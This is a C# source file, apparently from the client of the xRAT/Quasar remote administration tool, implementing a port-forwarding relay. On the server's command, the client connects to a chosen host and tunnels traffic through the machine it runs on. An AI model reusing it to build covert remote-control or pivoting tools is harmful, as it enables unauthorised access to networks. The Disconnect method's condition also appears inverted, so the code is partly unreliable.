using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.PortForward.Local.Packets;

namespace xClient.Core.PortForward.Local
{
    public class LocalPortForwardClient
    {
        public const int BUFFER_SIZE = 8192;

        public int ClientId { get; set; }
        private string _remoteHost;
        private int _remotePort;

        private Socket _remoteSocket;
        private byte[] _buffer;

        private Client _client;
        private bool _isDisconnectSent;

        public LocalPortForwardClient(LocalPortForwardConnect command, Client client)
        {
            this.ClientId = command.ClientId;
            this._remoteHost = command.RemoteHost;
            this._remotePort = command.RemotePort;
            this._client = client;

            this._remoteSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            this._remoteSocket.BeginConnect(Dns.GetHostAddresses(_remoteHost), _remotePort, AsyncConnect, null);
        }

        private void AsyncConnect(IAsyncResult ar)
        {
            try
            {
                _remoteSocket.EndConnect(ar);
            }
            catch
            {
                new LocalPortForwardConnectResponse(ClientId, false, _remoteSocket.LocalEndPoint.ToString()).Execute(_client);
                _isDisconnectSent = true;
                Disconnect();
            }

            if (_remoteSocket.Connected)
            {
                new LocalPortForwardConnectResponse(ClientId, true, _remoteSocket.LocalEndPoint.ToString()).Execute(_client);

                _buffer = new byte[BUFFER_SIZE];

                try
                {
                    _remoteSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    Disconnect();
                }
            }
            else
            {
                new LocalPortForwardConnectResponse(ClientId, false, _remoteSocket.LocalEndPoint.ToString()).Execute(_client);
                _isDisconnectSent = true;
                Disconnect();
            }
        }
        
        private void AsyncReceive(IAsyncResult ar)
        {
            try
            {
                int received = _remoteSocket.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] data = new byte[received];
                Array.Copy(_buffer, data, received);
                new LocalPortForwardData(ClientId, data).Execute(_client);

                _remoteSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
            }
        }
        
        public void SendToRemote(byte[] data)
        {
            try
            {
                _remoteSocket.Send(data);
            }
            catch
            {
                Disconnect();
            }
        }

        public void Disconnect()
        {
            try
            {
                _remoteSocket.Close();
            }
            catch { }
            if (_isDisconnectSent)
            {
                new LocalPortForwardDisconnect(ClientId).Execute(_client);
                _isDisconnectSent = true;
            }
            _client.RemoveLocalPortForwardClient(ClientId);
        }
        
    }
}
